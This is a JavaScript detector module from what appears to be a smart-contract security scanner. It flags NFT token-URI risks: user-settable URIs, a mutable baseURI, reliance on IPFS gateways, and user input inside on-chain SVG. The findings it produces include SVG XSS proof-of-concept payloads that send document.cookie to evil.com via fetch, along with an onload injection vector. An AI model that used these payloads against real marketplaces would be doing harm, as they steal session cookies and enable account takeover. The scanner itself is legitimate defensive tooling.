module.exports = {
  name: 'token-uri-manipulation',
  aliases: ['metadata', 'tokenuri', 'svg-xss'],
  severity: 'medium',
  description: 'Token URI Manipulation — malicious metadata, IPFS gateway hijack, SVG XSS in on-chain NFTs',
  async execute(ctx) {
    const findings = [];
    const { contracts } = ctx;
    const fs = require('fs');

    for (const file of contracts) {
      if (file.error) continue;
      const source = fs.readFileSync(file.file, 'utf8');

      for (const contract of file.contracts || []) {
        const hasTokenURI = /tokenURI|_tokenURI|_baseURI|baseURI|tokenUri/i.test(source);
        if (!hasTokenURI) continue;

        // Pattern 1: User-controlled tokenURI — SVG XSS
        if (/ERC721|ERC1155/i.test(source)) {
          const uriIsUserControlled = contract.functions?.some(fn => {
            if (!/setTokenURI|setURI|updateURI|setBaseURI/i.test(fn.name)) return false;
            const fnBody = this._extractFunctionBody(source, fn.name);
            return fnBody && !/onlyOwner|onlyAdmin|onlyMinter/i.test(fn.modifiers?.join(' ') || '');
          }) || false;

          if (uriIsUserControlled) {
            findings.push({
              title: `User-Controlled Token URI — XSS via SVG metadata, phishing via external links`,
              severity: 'medium',
              contract: `${contract.name} (${file.file})`,
              evidence: { userControlledURI: true },
              impact: `Users can set arbitrary token URIs. This enables:
1. **SVG XSS:** Set URI to on-chain SVG containing JavaScript → executes in NFT marketplace UIs
2. **Phishing:** Set URI to external site mimicking marketplace → steal user credentials
3. **Data exfiltration:** SVG can make external requests, leaking user data
4. **Marketplace manipulation:** Display fake attributes/rarity to deceive buyers`,
              remediation: 'Restrict URI setting to contract owner/admin. Validate URI format (https:// or ipfs:// only). Sanitize SVG content. Use allowlisted IPFS CIDs.',
              poc: {
                attackFlow: [
                  '1. Attacker mints NFT with custom tokenURI',
                  '2. URI points to SVG containing: <svg onload="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">',
                  '3. Marketplace renders the SVG → JavaScript executes',
                  '4. Attacker steals user session cookies',
                  '5. Attacker accesses user account on marketplace',
                ],
                xssPayload: '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://evil.com/"+document.cookie)</script></svg>',
              },
            });
          }
        }

        // Pattern 2: Centralized baseURI — owner can change all metadata
        const hasBaseURI = /baseURI|_baseURI|_baseExtension/i.test(source);
        if (hasBaseURI) {
          const baseURIFns = contract.functions?.filter(fn => /setBaseURI/i.test(fn.name)) || [];
          const hasTimelock = baseURIFns.some(fn => fn.modifiers?.some(m => /timelock|onlyGovernance/i.test(m)));
          if (baseURIFns.length > 0 && !hasTimelock) {
            findings.push({
              title: `Owner Can Change Base URI — all NFT metadata can be swapped`,
              severity: 'medium',
              contract: `${contract.name} (${file.file})`,
              evidence: { ownerControlledBaseURI: true },
              impact: 'Owner can change the baseURI, instantly changing ALL NFT metadata. This means: (1) all NFT images/descriptions can be replaced, (2) buyers who verified specific metadata have no guarantee, (3) owner can rug-pull by changing metadata to worthless/blank. This breaks the trust assumption that NFT metadata is immutable.',
              remediation: 'Use IPFS CIDs for baseURI (content-addressed, cannot be changed). Add timelock to baseURI changes. Freeze baseURI after minting completes.',
              poc: { attackFlow: ['1. Users buy NFTs with specific art/metadata', '2. Owner changes baseURI to blank/malicious server', '3. All NFTs now display different content', '4. Users\' purchased art is gone — value destroyed'] },
            });
          }
        }

        // Pattern 3: IPFS gateway dependency
        if (/ipfs:\/\/|ipfs\.io|gateway\.pinata|dweb\.link/i.test(source)) {
          findings.push({
            title: `IPFS Gateway Dependency — metadata availability depends on third-party gateways`,
            severity: 'low',
            contract: `${contract.name} (${file.file})`,
            evidence: { usesIPFSGateway: true },
            impact: 'Token URIs use IPFS gateways (ipfs.io, pinata.cloud). If the gateway goes down or the pin is lost, NFT metadata becomes unavailable. While the data is still on IPFS, users need a running gateway to view it. Centralized gateways are a single point of failure.',
            remediation: 'Use content-addressed IPFS CIDs without gateway prefix (ipfs://CID). Let clients resolve gateways. Pin data on multiple gateways.',
            poc: { scenario: 'IPFS gateway goes down → all NFT metadata unavailable → marketplace shows blank NFTs' },
          });
        }

        // Pattern 4: On-chain SVG generation with user input
        if (/svg|SVG|<svg|<rect|<circle|<text/i.test(source)) {
          const hasUserInputInSVG = contract.functions?.some(fn => {
            const fnBody = this._extractFunctionBody(source, fn.name);
            return fnBody && /svg|SVG/i.test(fnBody) && /msg\.sender|msg\.data|calldata/i.test(fnBody);
          }) || false;

          if (hasUserInputInSVG) {
            findings.push({
              title: `User Input in SVG Generation — potential script injection in on-chain NFTs`,
              severity: 'medium',
              contract: `${contract.name} (${file.file})`,
              evidence: { userInputInSVG: true },
              impact: 'SVG is generated on-chain with user-controlled input. If input is not sanitized, attacker can inject JavaScript via SVG event handlers (onload, onclick) or foreignObject elements. This executes in NFT marketplace UIs that render SVGs.',
              remediation: 'Sanitize all user input before embedding in SVG. Remove event handlers. Use allowlisted characters only. Consider generating SVG server-side with validated templates.',
              poc: { xssVector: '<foreignObject><body onload="alert(1)"></foreignObject>' },
            });
          }
        }
      }
    }
    return findings;
  },

  _extractFunctionBody(source, fnName) {
    const fnRe = new RegExp(`function\\s+${fnName}\\s*\\([^)]*\\)[^{]*\\{`, 'g');
    const match = fnRe.exec(source);
    if (!match) return null;
    const start = source.indexOf('{', match.index) + 1;
    let depth = 1;
    for (let i = start; i < source.length; i++) {
      if (source[i] === '{') depth++;
      else if (source[i] === '}') { depth--; if (depth === 0) return source.substring(start, i); }
    }
    return source.substring(start);
  },
};
